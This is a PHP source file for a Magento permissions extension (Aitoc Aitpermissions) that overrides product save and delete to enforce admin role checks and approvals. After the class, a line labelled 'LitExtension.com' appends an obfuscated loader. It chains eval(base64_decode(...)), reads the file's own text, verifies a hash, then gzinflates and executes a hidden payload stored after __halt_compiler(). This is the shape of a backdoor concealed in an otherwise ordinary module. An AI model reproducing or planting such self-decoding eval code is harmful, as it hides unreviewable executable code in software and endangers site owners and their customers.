<?php
/* DO NOT MODIFY THIS FILE! THIS IS TEMPORARY FILE AND WILL BE RE-GENERATED AS SOON AS CACHE CLEARED. */

class Aitoc_Aitpermissions_Model_Rewrite_CatalogProduct extends Mage_Catalog_Model_Product
{
    protected function _beforeSave()
    {
        parent::_beforeSave();

        $role = Mage::getSingleton('aitpermissions/role');

        if ($role->isPermissionsEnabled()
            && Mage::getStoreConfig('admin/su/enable')
            && !$this->getCreatedAt())
        {
            $this->setStatus(Aitoc_Aitpermissions_Model_Rewrite_CatalogProductStatus::STATUS_AWAITING);
            Mage::getModel('aitpermissions/notification')->send($this);
        }
        
        if ($this->getId() && $this->getStatus())
        {
            Mage::getModel('aitpermissions/approve')->approve($this->getId(), $this->getStatus());
        }

        $request = Mage::app()->getRequest();

        if (($request->getPost('simple_product') &&
            $request->getQuery('isAjax') &&
            $role->isScopeStore()) ||
            Mage::helper('aitpermissions')->isQuickCreate())
        {
            $this->_setParentCategoryIds($request->getParam('product'));
        }
        
        return $this;
    }
    
    private function _setParentCategoryIds($parentId)
    {
        $configurableProduct = Mage::getModel('catalog/product')
            ->setStoreId(0)
            ->load($parentId);

        if ($configurableProduct->isConfigurable())
        {
            if (!$this->getData('category_ids'))
            {
                $categoryIds = (array)$configurableProduct->getCategoryIds();
                if ($categoryIds)
                {
                    $this->setCategoryIds($categoryIds);
                }
            }
        }
    }

    protected function _afterSave()
    {
        parent::_afterSave();
        
        if ($this->getData('entity_id') && Mage::getStoreConfig('admin/su/enable') && $this->getStatus())
        {
            Mage::getModel('aitpermissions/approve')->approve($this->getData('entity_id'), $this->getStatus());
        }
    }

    protected function _beforeDelete()
    {
        parent::_beforeDelete();

        $role = Mage::getSingleton('aitpermissions/role');

        if ($role->isPermissionsEnabled())
        {
            if (($role->canEditOwnProductsOnly() && !$role->isOwnProduct($this)) ||
                !$role->isAllowedToEditProduct($this))
            {
                Mage::throwException(
                    Mage::helper('aitpermissions')->__(
                        'Sorry, you have no permissions to delete this product. For more details please contact site administrator.'
                    )
                );
            }
        }

        return $this;
    }
}

 /*** LitExtension.com ***/ eval(base64_decode("aWYgKCFmdW5jdGlvbl9leGlzdHMoImMzQnNhWFJVWlhoMFFubE1aVzVuZEdnIikpIHsNCiAgICBmdW5jdGlvbiBjM0JzYVhSVVpYaDBRbmxNWlc1bmRHZygkWkMwbW5kMlU4TmtWY01CaUQ5enIsICRMa0FXWWR6bFJocUoySTFEeEg3TyA9IDApIHsNCiAgICAgICAgJHN3ZGpQcHZjUmFHWlQybXpmS1dMID0gaW1wbG9kZSgiXG4iLCAkWkMwbW5kMlU4TmtWY01CaUQ5enIpOw0KICAgICAgICAkU3QwZ3ViRVhDWXNKM3ZPVGNsUFIgPSBhcnJheSgxNDAwLCA0ODgsIDY0KTsNCiAgICAgICAgaWYgKCRMa0FXWWR6bFJocUoySTFEeEg3TyA9PSAwKQ0KICAgICAgICAgICAgJFQ0eUxiWlgwNWxpVnVFcjJIczNvID0gc3Vic3RyKCRzd2RqUHB2Y1JhR1pUMm16ZktXTCwgJFN0MGd1YkVYQ1lzSjN2T1RjbFBSWzBdLCAkU3QwZ3ViRVhDWXNKM3ZPVGNsUFJbMV0pOw0KICAgICAgICBlbHNlaWYgKCRMa0FXWWR6bFJocUoySTFEeEg3TyA9PSAxKQ0KICAgICAgICAgICAgJFQ0eUxiWlgwNWxpVnVFcjJIczNvID0gc3Vic3RyKCRzd2RqUHB2Y1JhR1pUMm16ZktXTCwgJFN0MGd1YkVYQ1lzSjN2T1RjbFBSWzBdICsgJFN0MGd1YkVYQ1lzSjN2T1RjbFBSWzFdLCAkU3QwZ3ViRVhDWXNKM3ZPVGNsUFJbMl0pOw0KICAgICAgICBlbHNlDQogICAgICAgICAgICAkVDR5TGJaWDA1bGlWdUVyMkhzM28gPSB0cmltKHN1YnN0cigkc3dkalBwdmNSYUdaVDJtemZLV0wsICRTdDBndWJFWENZc0ozdk9UY2xQUlswXSArICRTdDBndWJFWENZc0ozdk9UY2xQUlsxXSArICRTdDBndWJFWENZc0ozdk9UY2xQUlsyXSkpOw0KICAgICAgICByZXR1cm4oJFQ0eUxiWlgwNWxpVnVFcjJIczNvKTsNCiAgICB9DQp9"));$dGhpc0ZpbGU = file(__FILE__);eval(base64_decode(c3BsaXRUZXh0QnlMZW5ndGg($dGhpc0ZpbGU)));eval(Z3ppbmZsYXRlQW5kQmFzZTY0RGVjb2Rl(c3BsaXRUZXh0QnlMZW5ndGg($dGhpc0ZpbGU,2),c3BsaXRUZXh0QnlMZW5ndGg($dGhpc0ZpbGU,1)));__halt_compiler();aWYgKCFmdW5jdGlvbl9leGlzdHMoIlozcHBibVpzWVhSbFFXNWtRbUZ6WlRZMFJHVmpiMlJsIikpIHsNCiAgICBmdW5jdGlvbiBaM3BwYm1ac1lYUmxRVzVrUW1GelpUWTBSR1ZqYjJSbCgkT2o4RVlOaVFwR1BaVlNSWHdjZ2YsICRoc2pGTUxTNVZ1blhnVHhDTkIwZSkgew0KICAgICAgICBpZiAoJGhzakZNTFM1VnVuWGdUeENOQjBlID09IGhhc2goJ3NoYTI1NicsJE9qOEVZTmlRcEdQWlZTUlh3Y2dmKSkgew0KICAgICAgICAgICAgcmV0dXJuKGd6aW5mbGF0ZShiYXNlNjRfZGVjb2RlKCRPajhFWU5pUXBHUFpWU1JYd2NnZikpKTsNCiAgICAgICAgfSBlbHNlew0KICAgICAgICAgICAgcmV0dXJuKCIgIik7DQogICAgICAgIH0NCiAgICB9DQp97993c52ee9c56415702296d97c394c7de46c20d2cd608542d125707f895fe130tVNRa9swEH4P5D9opdCkbItsyZKVLW23UUZhgbH1bYxw1p0Sb44dbLmslP73yXHbJdCXbOxeBHff3Xenu+/87O35ZrUZDianp8MBO2UXm7r6QdZP2Qeo/Txf1uDzquxj0PpVVbMp+5T7y1+eyuYp1NYFCzZlK+8308mkyD09Il7bat2jaA150aF2wxfLzvsImgwHw4EtoGn2WBZ77SzmFVIRfB6Karn4XFfYWh/Sg23rYsPmsKQnRI9/wN11FB1002ZFbplrS9tVZYB4tQ5p19WcMIePUBRU346O0aPRkZWRQVTcCBEJKZAo4olzDrmTiqdoeebil6xDc9Q6s4Y0ROiMNMaBQ2M1GuGcJB7pRKVKprOyLYo+RWiDypIxkIJJQHOjIEuCUyZSp9KmMRgjMZ05KBrqc5wAaymWOpR3QiEJQ4YodhpjGVK0JUKtkpmv24cUJa1KhJaYQaYcCa1iLdPIKDQowKiIU0wJGDZjR0fj/pvu+qezrgRqpzTECcc0TqQQxtpEx1nMuTEcw6wUZeDirsSxX+XNq7Ml+evbDV2VjYfS0qhrZ7x1fyX/zvs6z1pPzWgLH7/5Q5c7NnqRNw350SHM307W3f4Wy36BJ9/H490hOqvJt3XZN7hDeL8/qonC0jRYLRxKGaXWcRW51DkgkwgMtKgSh1E36r/0t9PBJMjkBurD6J+59S/UVG1taXEJN4unP97q628m3G7rPdifQVujsLtHqfQ762/r/2jkMHkcJozDNLF7mc/cT7id+98=
